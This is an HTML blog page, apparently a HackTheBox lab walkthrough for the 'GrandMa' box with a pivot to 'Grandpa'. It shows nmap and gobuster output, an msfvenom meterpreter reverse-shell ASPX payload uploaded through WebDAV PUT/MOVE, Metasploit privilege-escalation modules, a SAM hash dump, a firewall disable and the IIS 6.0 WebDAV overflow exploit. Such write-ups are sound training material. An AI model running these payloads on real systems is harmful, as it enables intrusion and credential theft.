@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Pwny_Sec</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-06-30T21:15:38 EDT">
+<title>GrandMa :: Pwny_Sec</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/grand-pa/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="pwny-sec">Pwny_Sec</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/pwny_sec"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/dll/" class="dd-item">
+    <div>
+        <a href="/concepts/dll/">
+            DLL-Hijacking
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/linux_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/linux_enum/">
+            Linux Enumeration
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/windows_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/windows_enum/">
+            Windows_enum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/chaos-og/">
+            CHAOS
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/inusectf/">
+            CTF
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier-root/">
+            CarrierRoot
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/ethereal/">
+            Ethereal
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/flujab/">
+            Flujab
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/grand-pa/">
+            GrandMa
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/help/">
+            HELP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/lightweight/">
+            LightWeight
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/vault/">
+            Vault
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/nmap/" class="dd-item">
+    <div>
+        <a href="/tools/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
+      <option value="/hackthebox/boxes/grand-pa/"  selected>-- GrandMa</option>
+      <option value="/hackthebox/boxes/help/" >-- HELP</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>GrandMa</h1>
+    
+    
+    
+    <p>Started out with nmap moved into enumeration with gobuster to enum web directories.</p>
+
+<p><strong>Nmap</strong></p>
+
+<pre><code>![gobuster](https://chickenpwny.github.io/images/grandma/gobuster.PNG)nmap -sV -sC -T5 -p80 -oA total-first 10.10.10.15                                                                    
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 20:05 EDT
+Nmap scan report for 10.10.10.15
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT                                                        
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan:
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                               
+|   Server Date: Sun, 30 Jun 2019 23:58:45 GMT
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK                                         
+|   Server Type: Microsoft-IIS/6.0
+|_  WebDAV type: Unkown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/options.PNG" alt="options" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/denied-2.PNG" alt="denied-2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/denied.PNG" alt="denied" /></p>
+
+<p><strong>Gobuster</strong>        ### Remember when you using gobuster on a windows system to look for windows files with -x</p>
+
+<pre><code>gobuster -w  /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -u http://10.10.10.14/ -x aspx,txt,html -t 200
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/gobuster.PNG" alt="gobuster" /></p>
+
+<p>OPTIONS  web request parameter. used below will return the type of webrequest allowed.</p>
+
+<p>Google says the put method is used to completely overwrite whatever is currently existing url. im going to try and use that to add a php backdoor. Got to remember were on a windows host luckley kali linx comes with a aspx page that will give us command injection.</p>
+
+<p>Then using the two web request methods put and move to first upload a file then use move to rename the file to aspx. First make a malicious aspx file using msfvenom. then using curl upload the file and rename it using the move request. Using</p>
+
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.2 LPORT=443 &gt; pinkie.aspx
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/malicious-aspx.PNG" alt="malicious-aspx" /></p>
+
+<p><strong>MetaSploit</strong> Now, need to setup a multi/handler on a msfconsole/metasploits. I like to run msfconsole from the shortcut link on kali. mostly because it sets up everything the database and supporting files.</p>
+
+<pre><code>use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST adddresss
+set LPORT port number
+run
+</code></pre>
+
+<p><strong>MALICIOUS ASPX</strong> I thought using curl was pretty cool.</p>
+
+<pre><code>curl -X PUT http://10.10.10.15/pinkie.txt --data-binary @pinkie.aspx
+curl -X MOVE -H 'Destination: http://10.10.10.15/pinkie.aspx' http://10.10.10.15/pinkie.txt
+curl http://10.10.10.15/pinkie.aspx
+</code></pre>
+
+<p>You may wish to delete soemthing.</p>
+
+<pre><code>curl -X DELETE http://10.10.10.15/pinkie.txt
+</code></pre>
+
+<p>I would like to note that 0xdf initially used the -d switch instead of &ndash;data-binary. similar to ftp binary mode.</p>
+
+<pre><code>-d switch is forr data 
+--data-binary
+</code></pre>
+
+<p><strong>Privilege Escalation</strong></p>
+
+<p>Using metasploit to get a shell, well background the current session then use <em>local_exploit_suggester</em> to find out what exploits to use. You may use any vulnerable exploit listed. trackpop_menu seems to work the best some of the other don&rsquo;t properly elevate like ms16_075_reflection</p>
+
+<pre><code>exploit/windows/local/ms14_058_track_popup_menu
+exploit/windows/local/ms14_070_tcpip_ioctl
+exploit/windows/local/ms15_051_client_copy_image
+exploit/windows/local/ms16_075_reflection
+exploit/windows/local/ms16_075_reflection_juicy
+</code></pre>
+
+<p>background once the session is elevated. type <em>hashdump</em> this will pull the password hashes from SAM &amp; system. we could use this to login into smb</p>
+
+<pre><code>hashdump
+</code></pre>
+
+<pre><code>Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::                                              
+ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::                                                    
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                      
+IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::                                               
+IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::                                               
+Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::                                                     
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6::: 
+</code></pre>
+
+<p><strong>Pivoting to Grandpa</strong></p>
+
+<p>Changing ip tables so we can&rsquo;t access it from out machine. removing any confusing. ippsec demonstration of this is pretty neat. first ping grandpa to verify it is up. next well go to our iptables and tell or host to drop outbound traffic to grandpa.</p>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/grandpa.PNG" alt="grandpa" /></p>
+
+<pre><code>ping 10.10.10.14
+</code></pre>
+
+<p>After, running the command below ping should, stop and produce a permissions denied error.</p>
+
+<pre><code>iptables -A OUTPUT -d 10.10.10.14 -j DROP
+</code></pre>
+
+<p>back on grandma well turn off the firewall.</p>
+
+<pre><code>netsh firewall set opmode disable
+</code></pre>
+
+<p>Next,well add a route to 10.10.10.14 inside msfconsole. background the session well portfwd to 10.10.10.15</p>
+
+<pre><code>route add 10.10.10.14 3
+3 is the session number might be different.
+</code></pre>
+
+<pre><code>portfwd add -L 10.10.10.15 -l 6000 -p 7000 -r 10.10.14.2
+</code></pre>
+
+<pre><code>portfwd add -l 445 -p 445 0r 127.0.0.1
+</code></pre>
+
+<p>next, background it until you escape the session. At this point i would like to point out we can scan 10.10.10.14 figure out what is running.</p>
+
+<pre><code>nmap -sC -sV -p80 10.10.10.14 -T5                                                            
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 15:36 EDT                                                                     
+Nmap scan report for grandma.htb (10.10.10.14)                                                                                      
+Host is up (0.12s latency).
+                                                                                                                                    
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:                                                                                                                     
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH                               
+| http-ntlm-info:                                                                                                                   
+|   Target_Name: GRANPA
+|   NetBIOS_Domain_Name: GRANPA                                                                                                     
+|   NetBIOS_Computer_Name: GRANPA
+|   DNS_Domain_Name: granpa                                                                                                         
+|   DNS_Computer_Name: granpa                                                                                                       
+|_  Product_Version: 5.2.3790
+|_http-server-header: Microsoft-IIS/6.0                                                                                             
+|_http-title: Error
+| http-webdav-scan:                                                                                                                 
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH      
+|   WebDAV type: Unkown                                                                                                             
+|   Server Type: Microsoft-IIS/6.0
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK                                                
+|_  Server Date: Sun, 30 Jun 2019 19:29:47 GMT                                                                                      
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                      
+Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds                                 
+</code></pre>
+
+<p>ippsec used this webdav bufferoverflow exploit to gain a foothold on grandpa. &ldquo;buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in IIS 6.0 in Microsoft windows server 2003 r2 allows remote attackers to execute arbitrary code via a long header beginning with &rdquo; If: &lt;http://&rdquo; in a PROPFIND request, as exploited in the wild in July August 2016.&rdquo;</p>
+
+<pre><code>exploit/windows/iis/iis_webdav_scstoragepathfromurl
+</code></pre>
+
+<p>Once a shell is established need to elevate the shell using one of the ones mentioned above copy image worked fine. for me</p>
+
+<p><img src="https://chickenpwny.github.io/images/grandma/root-grandpa.PNG" alt="root-grandpa" /></p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/flujab/" title="Flujab"> <i class="fa fa-chevron-left"></i><label>Flujab</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/help/" title="HELP" style="margin-right: 0px;"><label>HELP</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/grand-pa.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
